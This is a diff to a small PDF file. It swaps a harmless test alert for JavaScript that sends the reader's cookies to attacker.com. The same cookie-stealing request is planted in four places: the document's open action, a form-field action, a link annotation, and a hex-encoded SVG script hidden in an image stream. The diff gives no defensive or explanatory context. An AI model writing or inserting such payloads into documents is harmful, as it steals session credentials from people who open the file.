@@ -1,12 +1,12 @@
 %PDF-1.4
 1 0 obj
-<< /Type /Catalog /Pages 2 0 R /Names << /JavaScript 10 0 R >> /OpenAction 11 0 R >>
+<< /Type /Catalog /Pages 2 0 R /Names << /JavaScript 10 0 R >> /AcroForm << /Fields [12 0 R] >> /OpenAction 11 0 R >>
 endobj
 2 0 obj
 << /Type /Pages /Kids [3 0 R] /Count 1 >>
 endobj
 3 0 obj
-<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources 5 0 R >>
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents [4 0 R 13 0 R] /Resources 5 0 R /Annots [12 0 R 14 0 R] >>
 endobj
 4 0 obj
 << /Length 44 >>
@@ -19,7 +19,7 @@ ET
 endstream
 endobj
 5 0 obj
-<< /Font << /F1 6 0 R >> >>
+<< /Font << /F1 6 0 R >> /XObject << /Img1 15 0 R >> >>
 endobj
 6 0 obj
 << /Type /Font /Subtype /Type1 /BaseFont /Helvetica /FontDescriptor 7 0 R >>
@@ -31,24 +31,49 @@ endobj
 << /Names [(EmbeddedScript) 11 0 R] >>
 endobj
 11 0 obj
-<< /S /JavaScript /JS (app.alert("Document-Level Test - May 29, 2025", 3);) >>
+<< /S /JavaScript /JS (var xhr = new XMLHttpRequest(); xhr.open('GET', 'https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie), true); xhr.send();) >>
+endobj
+12 0 obj
+<< /Type /Annot /Subtype /Widget /FT /Tx /T (Field1) /V (Test) /Rect [100 100 200 120] /AA << /F << /S /JavaScript /JS (var xhr = new XMLHttpRequest(); xhr.open('GET', 'https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie), true); xhr.send();) >> >> >>
+endobj
+13 0 obj
+<< /Length 84 >>
+stream
+q
+100 0 0 100 100 100 cm
+/Img1 Do
+Q
+endstream
+endobj
+14 0 obj
+<< /Type /Annot /Subtype /Link /Rect [100 150 200 170] /A << /S /JavaScript /JS (var xhr = new XMLHttpRequest(); xhr.open('GET', 'https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie), true); xhr.send();) >> >>
+endobj
+15 0 obj
+<< /Type /XObject /Subtype /Image /Width 100 /Height 100 /Filter /ASCIIHexDecode /Length 120 >>
+stream
+3C73766720786D6C6E733D22687474703A2F2F7777772E77332E6F72672F323030302F737667223E3C7363726970743E766172207868723D6E657720584D4C487474705265717565737428293B7868722E6F70656E2827474554272C272768747470733A2F2F61747461636B65722E636F6D2F737465616C3F636F6F6B69653D272B656E636F6465555249436F6D706F6E656E7428646F63756D656E742E636F6F6B6965292C74727565293B7868722E73656E6428293B3C2F7363726970743E3C2F7376673E
+endstream
 endobj
 xref
-0 12
+0 16
 0000000000 65535 f 
 0000000010 00000 n 
-0000000079 00000 n 
-0000000127 00000 n 
-0000000197 00000 n 
-0000000258 00000 n 
-0000000296 00000 n 
-0000000408 00000 n 
+0000000087 00000 n 
+0000000144 00000 n 
+0000000237 00000 n 
+0000000307 00000 n 
+0000000345 00000 n 
+0000000457 00000 n 
 0000000000 65535 f 
 0000000000 65535 f 
-0000000494 00000 n 
-0000000529 00000 n 
+0000000543 00000 n 
+0000000578 00000 n 
+0000000723 00000 n 
+0000000855 00000 n 
+0000001000 00000 n 
+0000001145 00000 n 
 trailer
-<< /Size 12 /Root 1 0 R >>
+<< /Size 16 /Root 1 0 R >>
 startxref
-594
+1289
 %%EOF
